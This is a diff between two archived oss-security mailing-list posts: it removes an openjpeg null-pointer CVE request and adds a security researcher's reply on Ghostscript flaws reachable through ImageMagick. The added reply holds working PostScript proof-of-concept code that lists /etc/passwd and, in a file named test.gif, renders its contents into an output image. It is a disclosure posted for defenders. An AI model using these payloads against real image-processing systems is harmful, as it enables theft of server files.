@@ -1,51 +1,109 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/4
-Message-ID: <7c197fe9-19b4-6d6b-69a9-5504a9efbcb2@724safe.com>
-Date: Sun, 18 Sep 2016 20:41:43 +0800
-From: vul@...safe <vul@...safe.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/28
+Message-ID: <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
+Date: Thu, 29 Sep 2016 14:28:28 -0700
+From: Tavis Ormandy <taviso@...gle.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request - openjpeg null ptr dereference
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-# Vulnerability
-openjpeg null ptr dereference in convert.c:1331
+On Thu, Sep 29, 2016 at 5:02 AM, Tavis Ormandy <taviso@...gle.com> wrote:
+> On Wed, Sep 28, 2016 at 11:25 PM, Florian Weimer <fw@...eb.enyo.de> wrote:
+>>
+>> * Tavis Ormandy:
+>>
+>> > Here is the code I'm testing with (Note: I really don't know much
+>> > postscript - and I hate it).
+>> >
+>> > $ cat test.ps
+>> > /dumpname {
+>> >     dup             % copy filename
+>> >     dup             % copy filename
+>> >     print           % print filename
+>> >     (\n) print      % print newline
+>> >     status          % stat filename
+>> >     {
+>> >         (stat succeeded\n) print
+>> >         ( ctime:) print
+>> >         64 string cvs print
+>> >         ( atime:) print
+>> >         64 string cvs print
+>> >         ( size:) print
+>> >         64 string cvs print
+>> >         ( blocks:) print
+>> >         64 string cvs print
+>> >         (\n) print
+>> >         (\n) print
+>> >     }{
+>> >         (unable to stat\n\n) print
+>> >     } ifelse
+>> >     .libfile        % open as library
+>> >     {
+>> >         (.libfile returned file\n\n) print
+>> >         64 string readstring
+>> >         pop         % discard result (should proably test)
+>> >         print
+>> >         (\n) print
+>> >     }{
+>> >         (.libfile returned string\n) print
+>> >         print
+>> >         (\n) print
+>> >     } ifelse
+>> > } def
+>> >
+>> > (/etc/pass*) /dumpname load 256 string filenameforall
+>>
+>> filenameforall was fixed as part of this:
+>>
+>>   http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
+>>   http://bugs.ghostscript.com/show_bug.cgi?id=694724
+>>
+>> This also covers getenv and has already been assigned CVE-2013-5653.
+>
+> Thanks Florian, that explains it, although the distros do not appear
+> to have picked that patch up.
+>
+>>
+>> > $ identify test.ps
+>> > /etc/passwd
+>> > stat succeeded
+>> >  ctime:1474998792 atime:1474998792 size:2662 blocks:8
+>> >
+>> > .libfile returned file
+>>
+>> .libfile is not yet fixed upstream.  I reported this upstream:
+>>
+>>   http://bugs.ghostscript.com/show_bug.cgi?id=697169
+>
+> Thanks - seems like bad news for any automated image/document processing.
+>
+> Tavis.
 
-# Version
-2.1.1  ( http://www.openjpeg.org/ )
+Just for future reference, here is an example of dumping a file to an
+image processed with ImageMagick that works with gs 9.20:
 
-# Address Sanitizer Output
-ASAN:SIGSEGV
-=================================================================
-==7358==ERROR: AddressSanitizer: SEGV on unknown address 0x00000000 (pc
-0x0815d204 bp 0xff846938 sp 0xff846380 T0)
-    #0 0x815d203 in skip_white
-/home/starlab/fuzzing/openjpeg/src/bin/jp2/convert.c:1331
-    #1 0x8135d81 in main
-/home/starlab/fuzzing/openjpeg/src/bin/jp2/opj_compress.c:1723
-    #2 0xf7343636 in __libc_start_main ??:?
-    #3 0x807a31b in _start ??:?
+$ cat test.gif
+%!PS
+/Size 20 def                             % font/line size
+/Line 0 def                              % current line
+/Buf 1024 string def                     % line buffer
+/Path 0 newpath def
 
-# PoC
-See poc.ppm
+/Courier-Bold findfont Size scalefont setfont
+1 1 1 setrgbcolor clippath fill          % draw white background
+0 0 0 setrgbcolor                        % set black foreground
 
-# Analysis
-In convert.c:1483 and convert.c:1485, variable s is uncheck after
-skip_int is called.
-A null ptr will be passed to skip_int again and will cause a null ptr
-dereference.
-
-# Report Timeline
-2016-09-16: FB3F15 of STARLAB discovered this issue
-2016-09-18:Patch released
-
-# Credit
-FB3F15 of STARLAB
-
-# PoC
-https://github.com/STARLABSEC/pocs/raw/master/openjpeg-nullptr-github-issue-842.ppm
-
-# External link
-https://github.com/uclouvain/openjpeg/issues/843
-
-
-
+(/etc/passwd) .libfile {
+    {
+        dup Buf readline
+        {
+            Path Line moveto show
+        }{
+            showpage
+            quit
+        } ifelse
+        % next line
+        /Line Line Size add def
+    } loop
+} if
+$ convert test.gif png:test.png
